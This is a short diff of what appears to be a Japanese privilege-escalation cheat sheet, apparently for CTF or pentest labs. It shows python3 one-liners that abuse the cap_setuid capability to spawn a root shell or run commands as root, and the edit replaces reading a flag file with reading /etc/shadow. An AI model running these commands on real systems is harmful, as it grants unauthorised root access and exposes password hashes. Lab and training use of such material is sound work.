@@ -55,7 +55,7 @@ python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
 
 # または特定コマンドを実行
 python3 -c "import os; os.setuid(0); os.system('id')"
-python3 -c "import os; os.setuid(0); os.system('cat /root/root.txt')"
+python3 -c "import os; os.setuid(0); os.system('cat /etc/shadow | head -1')"
 ```
 
 ### Perl で cap_setuid を悪用
